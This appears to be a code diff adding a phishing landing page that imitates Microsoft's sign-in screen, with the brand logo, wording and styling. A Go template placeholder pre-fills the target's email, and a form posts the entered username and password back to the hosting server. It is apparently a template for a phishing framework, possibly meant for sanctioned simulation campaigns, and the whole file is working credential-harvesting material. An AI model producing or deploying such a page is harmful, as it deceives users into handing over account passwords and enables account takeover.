@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body {
+            height: 100%;
+            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+            color: #1b1b1b;
+        }
+        body {
+            background-color: #f2f2f2;
+            background-image: linear-gradient(to bottom right, #eef3fb, #e6ebf5);
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 48px 16px;
+            min-height: 100%;
+        }
+        .card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.18);
+        }
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        .ms-logo .squares {
+            width: 21px;
+            height: 21px;
+            display: grid;
+            grid-template-columns: 10px 10px;
+            grid-template-rows: 10px 10px;
+            gap: 1px;
+            margin-right: 8px;
+        }
+        .ms-logo .squares span { display: block; }
+        .ms-logo .squares .s1 { background: #f25022; }
+        .ms-logo .squares .s2 { background: #7fba00; }
+        .ms-logo .squares .s3 { background: #00a4ef; }
+        .ms-logo .squares .s4 { background: #ffb900; }
+        .ms-logo .word { font-size: 15px; color: #5e5e5e; font-weight: 600; }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 8px 0 4px;
+            color: #1b1b1b;
+        }
+        .field { margin: 18px 0 0; }
+        label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 4px;
+            color: #1b1b1b;
+        }
+        input[type="email"], input[type="text"], input[type="password"] {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #666;
+            padding: 6px 0;
+            font-size: 15px;
+            background: transparent;
+            outline: none;
+        }
+        input:focus { border-bottom: 2px solid #0067b8; }
+        .links { margin-top: 14px; font-size: 13px; }
+        .links a { color: #0067b8; text-decoration: none; }
+        .links a:hover { text-decoration: underline; }
+        .actions {
+            margin-top: 28px;
+            text-align: right;
+        }
+        button {
+            background: #0067b8;
+            color: #ffffff;
+            border: none;
+            min-width: 108px;
+            padding: 10px 12px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        button:hover { background: #005da6; }
+        .subtext { font-size: 13px; color: #1b1b1b; margin-top: 12px; }
+        .footer {
+            max-width: 440px;
+            width: 100%;
+            text-align: right;
+            margin-top: 18px;
+            font-size: 12px;
+            color: #666;
+        }
+        .footer a { color: #666; text-decoration: none; margin-left: 12px; }
+        .footer a:hover { text-decoration: underline; }
+        @media (max-width: 480px) {
+            .card { padding: 32px 24px; }
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="card">
+            <div class="ms-logo">
+                <div class="squares" aria-hidden="true">
+                    <span class="s1"></span><span class="s2"></span><span class="s3"></span><span class="s4"></span>
+                </div>
+                <span class="word">Microsoft</span>
+            </div>
+
+            <h1>Sign in</h1>
+
+            <form method="POST" action="">
+                <div class="field">
+                    <label for="email">Email, phone, or Skype</label>
+                    <input type="email" id="email" name="username" value="{{.Email}}" autocomplete="username" required>
+                </div>
+
+                <div class="field">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Password" required>
+                </div>
+
+                <div class="links">
+                    <a href="/forgot">Can't access your account?</a>
+                </div>
+
+                <div class="actions">
+                    <button type="submit">Sign in</button>
+                </div>
+            </form>
+
+            <p class="subtext">No account? Contact your IT administrator.</p>
+        </div>
+
+        <div class="footer">
+            <a href="/privacy">Privacy &amp; cookies</a>
+            <a href="/terms">Terms of use</a>
+        </div>
+    </div>
+</body>
+</html>
